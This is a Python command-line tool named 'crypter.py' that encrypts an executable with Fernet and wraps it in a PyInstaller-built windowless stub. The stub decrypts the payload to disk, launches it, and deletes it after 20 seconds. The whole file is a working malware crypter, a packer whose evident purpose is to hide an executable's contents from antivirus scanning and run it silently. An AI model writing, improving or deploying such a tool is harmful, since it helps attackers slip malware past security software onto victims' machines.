from cryptography.fernet import Fernet
import sys
# import os
import subprocess

USAGE = \
    """
    crypter.py -- <option> <value>

    OPTIONS:
        -f, --file <VALUE> = "define witch file must be cryptographyed"
        -c, --crypt = "cryptography the selected file"
        -o, --output <VALUE> = "define the output file name"
            default = crypter_file.exe
    """


def crypter(input_file, output_file):
    with open(input_file, 'rb') as file:
        content = file.read()
    key = Fernet.generate_key()
    fernet = Fernet(key)
    crypto_content = fernet.encrypt(content)
    code = f"""\
from cryptography.fernet import Fernet
import os
import time

key = {key}
crypto_content = {crypto_content}

fernet = Fernet(key)

decrypt_content = fernet.decrypt(crypto_content)

with open('decrypt.exe', 'wb') as file:
    file.write(decrypt_content)

os.startfile('decrypt.exe')

time.sleep(20)
os.remove('decrypt.exe')
"""
    with open('crypto.py', 'w') as file:
        file.write(code)
        
    subprocess.call(('pyinstaller', '--onefile', '-w', '--name', f'{output_file}', 'crypto.py'))


def main(*args):
    c_option = False
    f_option = None
    f_value = None
    o_option = None
    o_value = "crypter_file"
    if '-f' in args or '--file' in args:
        try:
            f_option = '-f' if '-f' in args else '--file'
            f_value = args[args.index(f_option) + 1]
            if f_value.startswith('-'):
                raise ValueError(f"the option {f_option} require a value")
        except (IndexError, ValueError):
            raise ValueError(f"the option {f_option} require a value")
    if '-o' in args or '--output' in args:
        try:
            o_option = '-o' if '-o' in args else '--output'
            o_value = args[args.index(o_option) + 1]
            if o_value.startswith('-'):
                raise ValueError(f"the option {o_option} require a value")
        except (IndexError, ValueError):
            raise ValueError(f"the option {o_option} require a value")
    if '-c' in args or '--crypt' in args:
        c_option = True

    if c_option:
        crypter(f_value, o_value)
    else:
        print(USAGE)


if __name__ == "__main__":
    sys_args = sys.argv
    if len(sys_args) > 1:
        main(*sys_args[1:])
    else:
        print(USAGE)
